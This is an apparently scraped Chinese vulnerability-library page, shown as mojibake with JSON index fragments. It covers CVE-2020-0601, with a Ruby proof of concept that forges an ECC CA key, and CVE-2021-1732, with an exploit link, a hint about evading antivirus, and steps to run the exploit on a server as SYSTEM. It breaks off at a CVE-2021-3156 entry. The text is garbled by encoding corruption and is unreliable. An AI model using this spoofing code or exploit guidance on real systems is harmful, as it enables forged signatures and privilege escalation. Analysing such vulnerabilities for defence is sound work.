1Êúà15Êó•ÔºåÂæÆËΩØÂèëÂ∏É‰∫ÜÈíàÂØπCVE-2020-0601ÁöÑÂÆâÂÖ®Ë°•‰∏ÅÔºåËØ•ÊºèÊ¥ûÊòØÂæÆËΩØÂú®ÂÆûÁé∞Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÊï∞Â≠óËØÅ‰π¶È™åËØÅÊó∂‰∫ßÁîüÔºåÂèØË¢´Âà©Áî®‰∫é‰º™ÈÄ†Êù•Ëá™ÂèØ‰ø°‰ªªÊù•Ê∫êÁöÑÁ≠æÂêçÊàñËØÅ‰π¶ÔºåÂπ∂‰∏îÂõ†ÂÖ∂‰∏öÂä°ÁâπÊÄß‰ºöË°çÁîüÂá∫Â§öÁßçÊîªÂáªÂêëÈáèÔºåÂÖ∑ÊúâÊûÅÈ´òÁöÑÂèØÂà©Áî®‰ª∑ÂÄºÂíåÊûÅÂ§ßÁöÑÊΩúÂú®Á†¥ÂùèÂäõÔºåWin 10Âíåwindows server 2016 & 2019‰πüÈÉΩÂú®ÂÖ∂ÂΩ±ÂìçËåÉÂõ¥ÂÜÖ„ÄÇËØ•ÊºèÊ¥ûÁî±ÁæéÂõΩNSAÂõΩÂÆ∂ÂÆâÂÖ®Â±ÄÂèëÁé∞ÂêéÊ±áÊä•ÁªôÂæÆËΩØÂÖ¨Âè∏Ôºå‰πüË¢´ËÆ§‰∏∫ÊòØÁ¨¨‰∏Ä‰∏™NSAÂÖ¨ÂºÄÊä´Èú≤ÁöÑËΩØ‰ª∂Á≥ªÁªüÊºèÊ¥ûÔºåÂΩìÁÑ∂‰πüÊúâÂèØËÉΩÂ≠òÂú®ÂÖ∂ÁâπÊÆäÁöÑÊàòÊúØÁõÆÁöÑ„ÄÇÁªøÁõüÁßëÊäÄM01NÊîªÂáªÂÆâÂÖ®Á†îÁ©∂Âõ¢ÈòüÂØπÊ≠§ÊºèÊ¥ûÂéüÁêÜËøõË°å‰∫ÜËØ¶ÁªÜÂàÜÊûêÂπ∂Â§çÁé∞‰∫ÜÂ§öÁßçÂèØËÉΩÁöÑÊîªÂáªÊñπÊ≥ïÔºåÊèêÂá∫‰∫ÜËØ¶ÁªÜÁöÑÊ£ÄÊµãÂèäÊï¥ÊîπÊñπÊ°à„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Â∏¶ÊúâÊåáÂÆöÂèÇÊï∞ÁöÑECCÂØÜÈí•ÁöÑËØÅ‰π¶ÁöÑMicrosoft WindowsÁâàÊú¨ ‰æùËµñ‰∫éWindows CryptoAPIÁöÑÂ∫îÁî®Á®ãÂ∫è ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥ûÂéüÁêÜ CVE-2020-0601ÁöÑÊ†πÊ∫êÊòØÂæÆËΩØÁöÑÂä†ÂØÜÂ∫ìcrypt32.dll‰∏≠Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÁöÑÂÆûÁé∞ÈóÆÈ¢òÔºåÈ¶ñÂÖàÊàë‰ª¨Êù•‰∫ÜËß£‰∏Ä‰∏ãÊ§≠ÂúÜÂä†ÂØÜÁÆóÊ≥ïÁöÑÂü∫Êú¨ÂéüÁêÜ„ÄÇ Ë¶ÅÂΩ¢Ë±°Âú∞ÁêÜËß£Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÔºåÂèØ‰ª•ÁªìÂêàÂõæÂΩ¢Êù•ÁúãÔºå‰ª•‰∏ãÊòØ‰∏Ä‰∏™Á¨¶ÂêàÊ§≠ÂúÜÊõ≤Á∫øÁöÑÊñπÁ®ãy2 = x3 + ax + bÔºåÂõæÂÉèÂ¶Ç‰∏ãÔºö Ê§≠ÂúÜÊõ≤Á∫øÂÖ∑ÊúâÁöÑ‰∏Ä‰∫õÁã¨ÁâπÁöÑÊÄßË¥®‰ΩøÂÆÉÈÄÇÂêàÁî®‰∫éÂä†ÂØÜÁÆóÊ≥ïÔºö Ê§≠ÂúÜÊõ≤Á∫øÂÖ≥‰∫éxËΩ¥ÂØπÁß∞ ‰ªª‰Ωï‰∏ÄÊù°ÈùûÂûÇÁõ¥ÁöÑÁ∫ø‰∏éÊõ≤Á∫øÊúÄÂ§öÊúâ‰∏â‰∏™ÁÇπÁõ∏‰∫§ Êõ≤Á∫øÊòØÂÖâÊªëÁöÑÔºåÂç≥Êõ≤Á∫øÁöÑÊâÄÊúâÁÇπÈÉΩÊ≤°Êúâ‰∏§‰∏™ÊàñËÄÖ‰∏§‰∏™‰ª•‰∏äÁöÑ‰∏çÂêåÁöÑÂàáÁ∫ø Âú®Ê§≠ÂúÜÊõ≤Á∫ø‰∏ä‰ªªÊÑè‰∏§ÁÇπA„ÄÅBÔºàËã•A„ÄÅBÈáçÂêàÂàô‰ΩúAÁöÑÂàáÁ∫øÔºâÔºå‰ΩúÁõ¥Á∫ø‰∫§‰∫éÊ§≠ÂúÜÊõ≤Á∫øÂè¶‰∏ÄÁÇπCÔºåËøáCÂÅöyËΩ¥ÁöÑÂπ≥Ë°åÁ∫ø‰∏éÊ§≠ÂúÜÊõ≤Á∫ø‰∫§‰∫éCÁÇπÔºåÂÆö‰πâA+B=C„ÄÇÊ§≠ÂúÜÊõ≤Á∫øÁöÑÂä†Ê≥ïÁ¨¶Âêà‰∫§Êç¢ÂæãÂíåÁªìÂêàÂæã„ÄÇ Â¶ÇÊûúA„ÄÅBÊòØÂêå‰∏Ä‰∏™ÁÇπÔºåÂàôËøáA‰ΩúÊ§≠ÂúÜÊõ≤Á∫øÁöÑÂàáÁ∫øÔºå‰ª•ÂêåÊ†∑ÁöÑÊñπÊ≥ïÂæóÂà∞ÂØπÂ∫îÁöÑÁªìÊûú C=2A „ÄÇ Êé•‰∏ãÊù•ÊòØÊ§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁõ∏ÂÖ≥ÁöÑÈáçÁÇπÔºåÂ¶ÇÊûúÂØπÂ§ö‰∏™AËøõË°åÁ¥ØÂä†,ÂàôÂèØ‰æùÊ¨°Á¥ØÂä†ËøûÁ∫øÂæóÂà∞nAÁöÑÂÄº „ÄÇ Ëµ∑ÁÇπ‰∏∫AÔºåÁªàÁÇπD=3AÔºåÈò∂‰∏∫3 „ÄÇ Ëµ∑ÁÇπ‰∏∫AÔºåÁªàÁÇπG=4AÔºåÈò∂‰∏∫4„ÄÇ Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜ ËÄÉËôëK=kGÔºåÂÖ∂‰∏≠K„ÄÅG‰∏∫Ê§≠ÂúÜÊõ≤Á∫øEp(a,b)‰∏äÁöÑÁÇπÔºån‰∏∫GÁöÑÈò∂„ÄÇk‰∏∫Â∞è‰∫énÁöÑÊï¥Êï∞„ÄÇÂàôÁªôÂÆökÂíåGÔºåÊ†πÊçÆÂä†Ê≥ïÊ≥ïÂàôÔºåËÆ°ÁÆóKÂæàÂÆπÊòìÔºàÂè™Ë¶ÅÈÄêÊ¨°Ê±ÇËß£Ôºâ‰ΩÜÂèçËøáÊù•ÔºåÁªôÂÆöKÂíåGÔºåÊ±ÇkÂ∞±ÈùûÂ∏∏Âõ∞Èöæ„ÄÇÂõ†‰∏∫ÂÆûÈôÖ‰ΩøÁî®‰∏≠ÁöÑECCÂéüÂàô‰∏äÊääÁßÅÈí•kÂèñÂæóÁõ∏ÂΩìÂ§ßÔºån‰πüÁõ∏ÂΩìÂ§ßÔºå‰∏îÊ§≠ÂúÜÊõ≤Á∫ø‰∏çÂÜçËøûÁª≠ËÄåÊòØÂú®ÂÆûÊï∞ÂÜÖÁ¶ªÊï£ÁöÑÂÄºÔºåË¶ÅÊään‰∏™Ëß£ÁÇπÈÄê‰∏ÄÁÆóÂá∫Âá†‰πéÊòØ‰∏çÂèØËÉΩÁöÑ„ÄÇËøôÂ∞±ÊòØÊ§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÁöÑÊï∞Â≠¶‰æùÊçÆ „ÄÇ ÁÇπGÁß∞‰∏∫Âü∫ÁÇπ k(k K‰∏∫ÂÖ¨ÂºÄÂØÜÈí• Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÔºàECCÔºâÂíåRSA‰∏ÄÊ†∑ÊòØ‰∏ÄÁßçÂÖ¨ÂºÄÂØÜÈí•Âä†ÂØÜÊäÄÊúØÔºåÂØπÂéüÂßãÊï∞ÊçÆ‰ª•ÂÖ¨Èí•Âä†ÂØÜÔºå‰ª•ÁßÅÈí•Ëß£ÂØÜÔºåÂç≥‰æøÊîªÂáªËÄÖËé∑ÂèñÂØÜÊñáÂíåÂÖ¨Èí•‰πüÊó†Ê≥ïÔºàÂú®ÂêàÁêÜÁöÑÊó∂Èó¥Êàñ‰ª£‰ª∑‰∏ãÔºâËß£ÂØÜËé∑ÂèñÊòéÊñá„ÄÇ ÂêåÊ†∑ÁöÑÔºåÊ§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÔºàECCÔºâ‰πüË¢´Áî®‰∫éÊï∞Â≠óÁ≠æÂêçÔºå‰ª•ÁßÅÈí•Âä†ÂØÜÁîüÊàêÁ≠æÂêçÔºå‰ª•ÂÖ¨Èí•Ëß£ÂØÜÈ™åËØÅÁ≠æÂêçÔºåÂ¶ÇÊûúÂíåÂéüÊñá‰∏ÄÊ†∑ÂàôÁ≠æÂêçÈ™åËØÅÊàêÂäü„ÄÇ ÂÖ¨ÂºÄÂØÜÈí•Âä†ÂØÜ‰πãÊâÄ‰ª•ÂèØÈù†ÊòØÂõ†‰∏∫ÂÆÉ‰ª¨Âà©Áî®‰∫ÜÂÖ¨Èí•ÂØÜÁ†ÅÈ¢ÜÂüüÁöÑÂçïÂêëÂáΩÊï∞ÂéüÁêÜÔºåÊ≠£ÂêëÊìç‰ΩúÈùûÂ∏∏ÁÆÄÂçïÔºåËÄåÈÄÜÂêëÊìç‰ΩúÈùûÂ∏∏Âõ∞Èöæ„ÄÇ Áî±GÔºàÂü∫ÁÇπÔºâÂá∫ÂèëÔºåËøõË°åkÔºàÁßÅÈí•ÔºâÊ¨°ÂèòÊç¢ÔºåÂè™Ë¶ÅÊåâÈÉ®Â∞±Áè≠Âú∞ËÆ°ÁÆóÔºåÂ∞±ËÉΩÂæàÂÆπÊòìÂú∞ÂæóÂà∞ÁªàÁÇπKÔºàÂÖ¨Èí•ÔºâÁöÑÂÄº„ÄÇ Â∑≤Áü•Ëµ∑ÁÇπGÔºàÂü∫ÁÇπÔºâÂíåÁªàÁÇπKÔºàÂÖ¨Èí•ÔºâÔºåË¶ÅÈÄÜÊé®ÂæóÂà∞ÁßªÂä®Ê¨°Êï∞kÔºàÁßÅÈí•ÔºâÂàôÊòØ‰∏Ä‰∏™ÂæàÈöæÁöÑÈóÆÈ¢òÔºàÊúÄ‰Ω≥ÁÆóÊ≥ï‰πüËææÂà∞‰∫ÜÂÖ®ÊåáÊï∞Â§çÊùÇÂ∫¶Ôºâ Áõ∏ÊØî‰º†ÁªüRSAÂä†ÂØÜÁÆóÊ≥ïÔºåÊ§≠ÂúÜÂä†ÂØÜÁÆóÊ≥ïÂÖ∑ÊúâÁùÄÂ§©ÁîüÁöÑ‰ºòÂäøÔºåÊ§≠ÂúÜÂä†ÂØÜÁÆóÊ≥ïÁöÑÈÄÜÂêëËøáÁ®ãÁõ∏ÊØîRSAÊúâÁùÄÊõ¥Â§ßÁöÑÊó∂Èó¥Â§çÊùÇÂ∫¶„ÄÇÂú®ÂØÜÈí•ÈïøÂ∫¶Áõ∏ÂêåÁöÑÊÉÖÂÜµ‰∏ãÔºåÊ§≠ÂúÜÂä†ÂØÜÁÆóÊ≥ïÁõ∏ÊØîRSAÂÖ∑ÊúâÊõ¥Â•ΩÁöÑÂÆâÂÖ®Âº∫Â∫¶„ÄÇ‰∏ÄËà¨ËÆ§‰∏∫Ôºå160ÊØîÁâπÁöÑÊ§≠ÂúÜÊõ≤Á∫øÂØÜÈí•Âç≥ÂèØÊèê‰æõ‰∏é1024ÊØîÁâπÁöÑRSAÂØÜÈí•Áõ∏ÂΩìÁöÑÂÆâÂÖ®Âº∫Â∫¶„ÄÇ ËæÉÁü≠ÁöÑÂØÜÈí•‰πüÊÑèÂë≥ÁùÄÊõ¥Â∞ëÁöÑÂ≠òÂÇ®Á©∫Èó¥„ÄÅÊõ¥Âø´ÁöÑÂä†Ëß£ÂØÜÈÄüÂ∫¶ÂíåÊõ¥Â∞ëÁöÑÂ∏¶ÂÆΩÊ∂àËÄóÔºåÊ≠£Âõ†‰∏∫Ê§≠ÂúÜÂä†ÂØÜÁÆóÊ≥ïÁöÑËøô‰∫õ‰ºòÂäøÔºåÂÆÉË¢´Áî®‰∫éWindowsÁöÑÁ≠æÂêçÁ≥ªÁªü„ÄÅhttpsÁöÑËØÅ‰π¶„ÄÅÊØîÁâπÂ∏ÅÁ≥ªÁªüÂíå‰∏≠ÂõΩÁöÑ‰∫å‰ª£Ë∫´‰ªΩËØÅÁ≥ªÁªü‰∏≠„ÄÇ ËôΩÁÑ∂Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÂÖ∑ÊúâÁùÄËÆ∏Â§ö‰ºòÂäøÔºåÁ∫ØÁÆóÊ≥ïËßíÂ∫¶Á†¥Ëß£ÈöæÂ∫¶ÊûÅÂ§ßÔºåÂæÆËΩØÂØπÊ≠§ÁÆóÊ≥ïÁöÑÂÆûÁé∞ÁöÑÁº∫ÊºèÂç¥ÁªôÊºèÊ¥ûÂà©Áî®Êèê‰æõ‰∫ÜÂèØ‰πò‰πãÊú∫„ÄÇÂõûÂà∞Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÊúÄÂü∫Êú¨ÁöÑÁ≠âÂºè K=kGÔºåÈ¶ñÂÖàÈúÄË¶ÅÊòéÁ°ÆÁöÑÊòØÔºåËôΩÁÑ∂ÂØπ‰∫éÁªôÂÆöÁöÑÂü∫ÁÇπGÂíåÂÖ¨Èí•KÔºåË¶ÅÊ±ÇËß£ÁßÅÈí•kÂæàÂõ∞ÈöæÔºå‰ΩÜÊòØÂ¶ÇÊûúÂèØ‰ª•‰ªªÊÑèÊåáÂÆöÂü∫ÁÇπGÔºåË¶ÅÊûÑÈÄ†‰∏ÄÂØπkÂíåG‰ΩøÁ≠âÂºèÊàêÁ´ãÂç¥ÊûÅÂÖ∂ÁÆÄÂçïÔºõÊúÄÁÆÄÂçïÁöÑÊÉÖÂÜµÔºå‰ª§Âü∫ÁÇπG=KÔºåÂàôÁßÅÈí•k=1ÔºåËøôÊ†∑‰∏ÄÂØπÂü∫ÁÇπÂíåÁßÅÈí•ÂèØ‰ª•‰ΩøÁ≠âÂºèÊàêÁ´ãÔºå‰πüÊòØÊúâÊïàÁöÑËß£„ÄÇ Âú®Ê≠£Â∏∏ÁöÑÊ†áÂáÜÊ§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ï‰∏≠ÔºåÂü∫ÁÇπGÂπ∂‰∏çÊòØÈöèÊÑèÊåáÂÆöÁöÑÔºåËÄåÊòØÊúâÂõ∫ÂÆöÁöÑÂÄºÔºàÊ†áÂáÜÁöÑ‰ΩúÁî®Ôºå‰æøÊòØÂØπÂü∫ÁÇπGÁ≠âÂèÇÊï∞ÁöÑÈÄâÊã©ÂÅöÂá∫ËßÑÂÆöÔºâÔºå‰æãÂ¶ÇÂú®secp256r1ÁâàÊú¨ÁöÑÊ§≠ÂúÜÊõ≤Á∫øÁÆóÊ≥ï‰∏≠ÔºåÂü∫ÁÇπGÂ∫îÂΩì‰∏∫Ê†áÂáÜËßÑÂÆöÁöÑÂõ∫ÂÆöÂÄºÔºåÂ¶ÇÊûúÂØπÂèÇÊï∞‰∏çÂä†È™åËØÅÔºå‰ΩøÂæóÁî®Êà∑ÂèØ‰ª•Ëá™ÂÆö‰πâ‰º†ÂÖ•ÁöÑÂü∫ÁÇπGÁöÑÂÄºÔºà‰Ωú‰∏∫ÂáΩÊï∞ÁöÑÂèÇÊï∞ÔºâÔºå‰∏äÈù¢ÁöÑÁßÅÈí•k=1ÁöÑÁâπÊÆäËß£Âç≥ÂèØÊàêÁ´ã„ÄÇ Âú®ÊúâÊºèÊ¥ûÁâàÊú¨ÁöÑcrypt32.dll‰∏≠È™åËØÅ‰ΩøÁî®ECCÁÆóÊ≥ïÁ≠æÂêçÈÉ®ÂàÜÁöÑÂáΩÊï∞ÊÅ∞ÊÅ∞ÊòØËøô‰∏™ÊÉÖÂÜµÔºåÂéüÂÖàÁöÑÂáΩÊï∞Êú™Âä†ÂèÇÊï∞È™åËØÅÔºåÂèÇ‰∏éËÆ°ÁÆóÁöÑÂü∫ÁÇπGÁöÑÂÜÖÂÆπÁî±Ë¢´È™åËØÅÁöÑËØÅ‰π¶ÈöèÊÑèÊåáÂÆöÔºå‰ΩøÊú™ÊéàÊùÉÁöÑËØÅ‰π¶ËÉΩÂ§üÊûÑÂª∫ÁßÅÈí•k=1ÁöÑÁâπÊÆäËß£Êù•ÊàêÂäüÈÄöËøáÊ§≠ÂúÜÂä†ÂØÜÁÆóÊ≥ïÁöÑÁ≠æÂêçÈ™åËØÅÁöÑËøáÁ®ã„ÄÇ ËÆ©Êàë‰ª¨‰ª•CVE-2020-0601ÁöÑ‰∏Ä‰∏™POC‰∏∫‰æãÊù•Ëß£ÊûêËôöÂÅáÂØÜÈí•ÁöÑÊûÑÂª∫ËøáÁ®ãÔºö require 'openssl' raw = File.read ARGV[0] # ËØªÂèñ‰ΩøÁî®ECCÁÆóÊ≥ïÁöÑËØÅ‰π¶Êñá‰ª∂ ca = OpenSSL::X509::Certificate.new(raw) # ËØªÂèñ‰ΩøÁî®ECCÁÆóÊ≥ïÁöÑËØÅ‰π¶ ca_key = ca.public_key # ‰ªéËØÅ‰π¶‰∏≠ÊèêÂèñÂÖ¨Èí•ca_key ca_key.private_key = 1 # ËÆæÁΩÆÁßÅÈí•‰∏∫1Ôºå‰ΩøÂæóÂÖ¨Èí•K==1*Âü∫ÁÇπGÁöÑÁ≠âÂºèÊàêÁ´ã group = ca_key.group group.set_generator(ca_key.public_key, group.order, group.cofactor) group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE ca_key.group = group # Âà©Áî®ÊûÑÂª∫ÁöÑÂÅáÂü∫ÁÇπGÂíåÂÅáÂØÜÈí•kËÆæÁΩÆÊñ∞group File.open(\"spoofed_ca.key\", 'w') { |f| f.write ca_key.to_pem } # Â∞ÜÊñ∞ÁöÑgroupÂÜôÂÖ•Êñá‰ª∂ ‰øÆË°•ÂêéÁöÑCrypt32.dll‰∏≠Ê§≠ÂúÜÊõ≤Á∫øÂä†ÂØÜÁÆóÊ≥ïÁöÑÂáΩÊï∞Â∑≤Âä†ÂÖ•‰∫ÜÂèÇÊï∞È™åËØÅÁöÑÈÉ®ÂàÜÔºåËß£ÂÜ≥‰∫ÜÁî±Ëá™Áî±ÊåáÂÆöÂèÇÊï∞GÂØºËá¥ÁöÑÊûÑÈÄ†Á¨¨‰∫å‰∏™ÁâπÊÆäÁöÑÊúâÊïàÂØÜÈí•ÁöÑÈóÆÈ¢ò„ÄÇ ‰∏ÄÂ§ÑÈ™åËØÅÊú∫Âà∂ÁöÑÂ§±ËØØÂØºËá¥‰ø°‰ªªÈìæÁöÑËøûÈîÅÂèçÂ∫î„ÄÇ Áé∞‰ª£ÁöÑÂÆâÂÖ®Á≥ªÁªü‰∏≠Â≠òÂú®ÁùÄ‚Äú‰ø°‰ªªÈìæ‚ÄùÁöÑÊ¶ÇÂøµÔºå‰ø°‰ªªÈìæÁöÑ‰∏ä‰∏ãÁ∫ßÂ≠òÂú®‰∏ÄÁßçÁ±ª‰ººÂçïÂêëÊãÖ‰øùÁöÑÂÖ≥Á≥ªÔºåÂ≠êÁ∫ßËØÅ‰π¶ÁöÑÂèØÈù†ÊÄßÁî±Á≠æÂêçÂÖ∂ÁöÑÁà∂Á∫ßËØÅ‰π¶ÊãÖ‰øù„ÄÇÁ≠æÂêçÊó∂Áî±Ê†πËØÅ‰π¶ÂºÄÂßã‰∏ÄÁ∫ßÁ∫ßÂêë‰∏ãÁ≠æÂêçÔºåÈ™åËØÅÊó∂ÂàôÈÄêÂ±ÇÊ∫ØÊ∫êÈ™åËØÅÔºåÁõ¥Âà∞ÊâæÂà∞‰ø°‰ªªÁöÑÊ†πËØÅ‰π¶Êñá‰ª∂ÔºåÊûÑÊàê‰∫Ü‰∏ÄÊù°‰ø°‰ªªÈìæ„ÄÇ‰Ωç‰∫éÊï¥‰∏™‚Äú‰ø°‰ªªÈìæ‚ÄùÊúÄ‰∏äÊñπÁöÑÊòØÊúÄ‰∏∫ÈáçË¶Å‰∏çÈúÄË¶ÅËá™ËØÅË∫´‰ªΩÁöÑÊ†πËØÅ‰π¶„ÄÇÊ†πËØÅ‰π¶‰∏ÄËà¨ÈöèÁ≥ªÁªüÈôÑÂ∏¶ÊàñÁî±ÁÆ°ÁêÜÂëòÂÆâË£ÖÂú®Á≥ªÁªüÂÜÖ„ÄÇ Ëøô‰∏™ÊºèÊ¥ûÁöÑÂ≠òÂú®Âàô‰ΩøÂæóÊûÑÈÄ†ÁöÑÊó†ÊïàÁ≠æÂêçÈÄöËøá‰∫ÜÈ™åËØÅÊú∫Âà∂Ôºå‰ΩøÊú¨Â∫îÊñ≠Ë£ÇÁöÑ‰ø°‰ªªÈìæË¢´Âà©Áî®ÔºåÈÄêÁ∫ßÊãÖ‰øùÁªßÁª≠‰∏ãÂéªÔºåÊúÄÁªà‰ΩøÈùûÊ≥ïÂÜÖÂÆπËé∑Âæó‰∫ÜËØÅ‰π¶ÊâÄÊúâËÄÖÁöÑÂêàÊ≥ïÁ≠æÂêçË∫´‰ªΩ„ÄÇ ÊºèÊ¥ûÂà©Áî® https://github.com/ollypwn/CurveBall ÂèÇËÄÉÊñáÁ´† cve-2020-0601-windows-cryptoapiÊ¨∫È™óÊºèÊ¥ûÂàÜÊûê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Windows Win32k Êú¨Âú∞ÊèêÊùÉÊºèÊ¥û CVE-2021-1732.html":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Windows/Windows Win32k Êú¨Âú∞ÊèêÊùÉÊºèÊ¥û CVE-2021-1732.html","title":"Windows Win32k Êú¨Âú∞ÊèêÊùÉÊºèÊ¥û CVE-2021-1732","keywords":"","body":"Windows Win32k Êú¨Âú∞ÊèêÊùÉÊºèÊ¥û CVE-2021-1732 ÊºèÊ¥ûÊèèËø∞ 2021Âπ¥2Êúà10Êó•ÔºåÂæÆËΩØÊØèÊúàÁöÑ‰æãË°åË°•‰∏ÅÂåÖ‰∏≠‰øÆÂ§ç‰∫Ü‰∏Ä‰∏™WindowsÁ≥ªÁªüÊú¨Âú∞ÊèêÊùÉÊºèÊ¥ûÔºåÊú¨Âú∞ÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî®Ê≠§ÊºèÊ¥ûÊèêÂçáÂà∞systemÊùÉÈôêÔºåÊçÆÁß∞Ê≠§ÊºèÊ¥ûË¢´Áî®‰∫éÂÆöÂêëÊîªÂáªÊ¥ªÂä®„ÄÇ Â•áÂÆâ‰ø°ÊÅØÂ®ÅËÉÅÊÉÖÊä•‰∏≠ÂøÉÁ∫¢Èõ®Êª¥Âõ¢ÈòüÁ¨¨‰∏ÄÊó∂Èó¥Ë∑üËøõËØ•ÊºèÊ¥ûÂπ∂Á°ÆËÆ§ÂÖ∂ÂèØÁî®ÊÄßÔºåÊºèÊ¥ûÁõ∏Â∫îÁöÑÂà©Áî®Á®ãÂ∫èÂ∑≤ÁªèÂÖ¨ÂºÄÔºåÊúâÂèØËÉΩË¢´ÊîπÈÄ†Êù•ÊâßË°åÂ§ßËåÉÂõ¥ÁöÑÊîªÂáªÔºåÂ∑≤ÁªèÊûÑÊàêÁé∞ÂÆûÁöÑÂ®ÅËÉÅ„ÄÇÁõÆÂâçÂæÆËΩØÂ∑≤Áªè‰øÆË°•‰∫ÜÊ≠§ÊºèÊ¥ûÔºåÂ•áÂÆâ‰ø°ÊÅØÂ®ÅËÉÅÊÉÖÊä•‰∏≠ÂøÉÊèêÈÜíÁõ∏ÂÖ≥Áî®Êà∑ÂèäÊó∂ÂÆâË£Ö2ÊúàË°•‰∏Å„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows Server, version 1909 (Server Core installation) Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems ÊºèÊ¥ûÂ§çÁé∞ ËøôÈáå‰ΩøÁî®ËÖæËÆØ‰∫ëÁöÑWindows 2019 Server Êê≠Âª∫ÁéØÂ¢É ÁõÆÂâçEXPÂ∑≤ÁªèÂÖ¨ÂºÄ‰∫Ü [!NOTE] ÂÖ¨‰ºóÂè∑ÂèëÈÄÅ CVE-2021-1732 ÂèØ‰ª•Ëé∑ÂèñÁºñËØëÂ•ΩÁöÑ EXP GithubÂÖ¨ÂºÄÂú∞ÂùÄ:https://github.com/KaLendsi/CVE-2021-1732-Exploit ÂéâÂÆ≥ÁöÑÂ∏àÂÇÖÂèØ‰ª•ÂÅö‰∏Ä‰∏ãÂÖçÊùÄÔºåÁé∞Âú®‰∏Ä‰∏ä‰º†Â∞±‰ºöË¢´ÊùÄ‰∫Ü ‰∏ä‰º†Âà∞ÊúçÂä°Âô®ËøêË°å, Ê≠§Êó∂ÊòØ‰ª•SystemÊùÉÈôêËøêË°å [!NOTE] ÊúâËìùÂ±èÊ¶ÇÁéáÔºå‰ΩøÁî®Ë∞®ÊÖéÁÇπÊíí CVE-2021-1723 whoami ÂèÇËÄÉÊñáÁ´† https://mp.weixin.qq.com/s/Ato-oKmNeyziXkKCr8d4kg Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Linux/":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Linux/","title":"Linux","keywords":"","body":"Linux Linux sudoÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3156 Linux kernelÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3493 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Linux/Linux sudoÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3156.html":{"url":"book/Êìç‰ΩúÁ≥ªÁªüÊºèÊ¥û/Linux/Linux sudoÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3156.html","title":"Linux sudoÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3156","keywords":"","body":"Linux sudoÊùÉÈôêÊèêÂçáÊºèÊ¥û CVE-2021-3156 ÊºèÊ¥ûÊèèËø∞ 2021Âπ¥1Êúà26Êó•ÔºåLinuxÂÆâÂÖ®Â∑•ÂÖ∑sudoË¢´ÂèëÁé∞‰∏•ÈáçÁöÑÂü∫‰∫éÂ†ÜÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û„ÄÇÂà©Áî®Ëøô‰∏ÄÊºèÊ¥ûÔºåÊîªÂáªËÄÖÊó†ÈúÄÁü•ÈÅìÁî®Êà∑ÂØÜÁ†ÅÔºå‰∏ÄÊ†∑ÂèØ‰ª•Ëé∑ÂæórootÊùÉÈôêÔºåÂπ∂‰∏îÊòØÂú®ÈªòËÆ§ÈÖçÁΩÆ‰∏ã„ÄÇÊ≠§ÊºèÊ¥ûÂ∑≤ÂàÜÈÖç‰∏∫CVE-2021-3156ÔºåÂç±Èô©Á≠âÁ∫ßËØÑÂàÜ‰∏∫7ÂàÜ„ÄÇ 